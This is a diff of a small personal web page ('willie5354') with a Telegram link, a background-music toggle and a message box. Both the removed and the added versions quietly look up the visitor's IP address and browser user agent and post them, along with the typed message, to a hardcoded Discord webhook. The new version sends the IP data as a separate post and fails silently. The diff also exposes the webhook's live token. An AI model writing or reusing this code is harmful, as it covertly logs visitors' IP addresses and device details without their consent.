@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>willie5354</title>
   <style>
     body {
@@ -45,6 +45,7 @@
       font-size: 30px;
       text-decoration: none;
       transition: background-color 0.3s, transform 0.2s;
+      user-select: none;
     }
 
     .social-tab {
@@ -74,6 +75,7 @@
       border: none;
       width: 300px;
       font-size: 18px;
+      outline: none;
     }
 
     .message-container button {
@@ -86,6 +88,7 @@
       cursor: pointer;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
       transition: all 0.3s ease;
+      user-select: none;
     }
 
     .message-container button:hover {
@@ -98,16 +101,16 @@
 <body>
   <h1>willie5354</h1>
 
-  <a class="social-tab" href="https://t.me/+H05Firmt1YFjZWI8" target="_blank">Join us on Telegram</a>
+  <a class="social-tab" href="https://t.me/+H05Firmt1YFjZWI8" target="_blank" rel="noopener noreferrer">Join us on Telegram</a>
   <div class="audio-button" onclick="toggleAudio()" id="audioToggle">Sound: Off</div>
 
   <div class="message-container">
     <input type="text" id="messageInput" placeholder="Send message..." />
-    <button onclick="sendMessage()">Send</button>
+    <button onclick="sendMessageAndIP()">Send</button>
   </div>
 
   <audio id="bgAudio" loop>
-    <source src="https://dn720305.ca.archive.org/0/items/hava-nagila-original/Hava%20Nagila%20Original.mp3" type="audio/mpeg">
+    <source src="https://dn720305.ca.archive.org/0/items/hava-nagila-original/Hava%20Nagila%20Original.mp3" type="audio/mpeg" />
     Your browser does not support the audio element.
   </audio>
 
@@ -125,41 +128,42 @@
       }
     }
 
-    function sendMessage() {
-      const message = document.getElementById('messageInput').value;
-      if (!message.trim()) {
-        alert("Message cannot be empty.");
-        return;
+    async function sendMessageAndIP() {
+      const input = document.getElementById('messageInput');
+      const message = input.value.trim();
+      if (!message) return; // Do nothing if message empty
+
+      const webhookURL = "https://discord.com/api/webhooks/1376545268882997269/wlE0guNblC0d11uHuTtyJ8KUYe0T42BhB8TjSfi9uS5_xMAmGT4AbZj2UqNFXTU-dQhl";
+
+      try {
+        // Send the user message first
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: message })
+        });
+
+        // Clear input immediately after sending message
+        input.value = "";
+
+        // Fetch IP info
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+
+        const userIP = ipData.ip;
+        const userAgent = navigator.userAgent;
+
+        // Send IP and user agent as separate message
+        const ipContent = `🌐 IP (IPv4): ${userIP}\n💻 User Agent: ${userAgent}`;
+
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: ipContent })
+        });
+      } catch (e) {
+        // Fail silently, no alerts or errors shown to user
       }
-
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-          const userIP = data.ip;
-          const userAgent = navigator.userAgent;
-
-          const fullMessage = 
-            `📨 Message: ${message}\n` +
-            `🌐 IP (IPv4): ${userIP}\n` +
-            `💻 User Agent: ${userAgent}`;
-
-          return fetch("https://discord.com/api/webhooks/1376545268882997269/wlE0guNblC0d11uHuTtyJ8KUYe0T42BhB8TjSfi9uS5_xMAmGT4AbZj2UqNFXTU-dQhl", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ content: fullMessage })
-          });
-        })
-        .then(res => {
-          if (res.ok) {
-            alert("Message sent");
-            document.getElementById('messageInput').value = "";
-          } else {
-            alert("Failed to send message.");
-          }
-        })
-        .catch(() => alert("error"));
     }
   </script>
 </body>
